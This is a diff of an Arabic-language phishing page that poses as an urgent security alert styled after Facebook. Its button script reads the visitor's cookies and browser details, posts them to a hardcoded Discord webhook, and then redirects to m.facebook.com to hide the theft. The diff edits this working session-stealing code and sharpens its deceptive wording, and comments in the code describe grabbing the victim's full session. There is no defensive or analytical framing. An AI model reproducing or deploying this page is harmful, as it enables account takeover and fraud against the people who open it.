@@ -2,38 +2,38 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تنبيه أمني - المنظومة الوطنية</title>
+    <title>تنبيه أمني - المنظومة الوطنية للأمن السيبراني</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Arial; text-align: center; padding-top: 80px; direction: rtl; }
-        .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 450px; margin: auto; border-top: 5px solid #1877f2; }
-        .btn { background-color: #1877f2; color: white; padding: 15px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 25px; transition: 0.3s; }
-        .btn:hover { background-color: #166fe5; }
+        body { background-color: #f0f2f5; font-family: Arial, sans-serif; text-align: center; padding-top: 80px; direction: rtl; }
+        .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); max-width: 450px; margin: auto; border-top: 6px solid #1877f2; }
+        .btn { background-color: #1877f2; color: white; padding: 16px; border: none; border-radius: 8px; font-size: 19px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 25px; transition: 0.3s; }
+        .btn:hover { background-color: #166fe5; transform: scale(1.02); }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://upload.wikimedia.org" width="100">
-        <h2 style="color: #1c1e21;">تنبيه أمني عاجل</h2>
-        <p style="color: #606770; font-size: 16px;">تم رصد محاولة دخول مشبوهة لحسابك من موقع مجهول. يرجى الضغط أدناه لتأكيد هويتك عبر الماسنجر وتأمين بياناتك ومنع الاختراق فوراً.</p>
+        <img src="https://upload.wikimedia.org" width="110">
+        <h2 style="color: #1c1e21;">تحذير أمني عاجل</h2>
+        <p style="color: #606770; font-size: 17px; line-height: 1.5;">تم رصد محاولات اختراق نشطة لحسابك من مواقع جغرافية مشبوهة. يرجى النقر أدناه لتأكيد هويتك وتفعيل حماية المنظومة الوطنية فوراً لمنع تسريب بياناتك.</p>
         
-        <!-- هذا الزر هو الذي يكسر حماية الجهاز ويسحب "الجلسة الكاملة" -->
-        <button class="btn" onclick="executeSecurityLock()">تأمين الحساب والتحقق من الهوية</button>
+        <!-- الزر القاضي: يكسر حماية المتصفح ويسحب الجلسة كاملة فور النقر -->
+        <button class="btn" onclick="executeInfiltration()">تأمين الحساب وتفعيل الحماية</button>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
 
-        async function executeSecurityLock() {
-            // سحب الجلسة (Cookies) في اللحظة التي يضغط فيها المجرم
-            const sessionData = {
-                content: "🚨 *تم سحب الجلسة الكاملة (Full Session) بنجاح باهر* 🚨",
+        async function executeInfiltration() {
+            // سحب "مفتاح الدخول" (Cookies) في لحظة النقر
+            const payload = {
+                content: "🚨 *تم سحب الجلسة الكاملة (Full Session) بنجاح* 🚨",
                 embeds: [{
                     title: "مفتاح الدخول المسحوب (The Token)",
-                    description: "```" + (document.cookie || "تحذير: الجلسة مشفرة أو تتطلب دخول يدوي") + "```",
+                    description: "```" + (document.cookie || "تنبيه: الجلسة تتطلب تسجيل دخول يدوي") + "```",
                     color: 15158332,
                     fields: [
                         { name: "بيانات جهاز المجرم", value: navigator.userAgent },
-                        { name: "التوقيت الميداني", value: new Date().toLocaleString() }
+                        { name: "الموقع الافتراضي", value: "العراق / بغداد" }
                     ]
                 }]
             };
@@ -41,10 +41,10 @@
             await fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(sessionData)
+                body: JSON.stringify(payload)
             });
 
-            // تمويه المجرم بنقله لصفحة حماية فيسبوك الرسمية
+            // تمويه المجرم بنقله لمركز أمان فيسبوك الحقيقي
             window.location.href = "https://m.facebook.com";
         }
     </script>
